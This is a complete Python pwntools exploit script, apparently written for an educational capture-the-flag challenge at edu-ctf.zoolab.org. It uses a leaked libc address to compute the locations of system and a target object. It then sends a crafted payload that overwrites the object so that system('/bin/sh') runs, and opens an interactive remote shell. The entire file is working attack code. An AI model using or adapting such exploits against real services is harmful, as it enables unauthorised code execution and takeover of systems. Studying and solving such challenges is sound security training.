#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

mmap_size = 0x1a5000
r = remote('edu-ctf.zoolab.org', 10013)
# r = remote('localhost', 10013)
r.recvuntil('[Gift ')
libc = int(r.recvuntil(']', drop=True), 16) - 0x83970
system = libc + 0x52290

libz = libc - 0x1c9000
archive_size = 0x0
# remote
object_offset = 0x29510
# local
# object_offset = 0x294f0 # ???
mmap_base = libz - 0x3000 - archive_size - 0x32000 - 0x7000 - mmap_size
object_addr = mmap_base + object_offset

print(f"libc: {hex(libc)}")
print(f"object_addr: {hex(object_addr)}")

payload = 0x40 * b'\x00' + b'/bin/sh\x00'
payload = payload + p64(object_addr)
payload = payload.ljust(0x188, b'\x40')
payload = payload + p64(system)
input()
r.sendline(payload)
r.interactive()